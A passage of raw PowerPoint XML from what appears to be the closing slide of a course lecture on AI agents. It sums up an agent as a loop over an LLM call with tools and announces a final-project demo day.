            <a:ext cx="103629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If you take three things out of today:</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 agent is a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>loop over an LLM call, with tools.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> The model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has no memory, so you're the one carrying the messages list.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Tools are authorized access</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> - the narrower the tool,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smaller the blast radius when something goes sideways.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agents you use every day are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>this same loop, just bigger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 no hidden runtime under there, only more tools and polish.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Next time: demo day, plus </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>where we go from here</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1"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Bring your final project - we'll </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>demo them all</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T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>hen we</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>’ll </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>close out the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>quarter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> with a tour of where all</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>this connects to the rest of CS.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11090</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>663</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Courier Prime</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3</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-01-27T09:14:16Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-02T22:35:35Z</dcterms:modified>
</cp:coreProperties>
</file>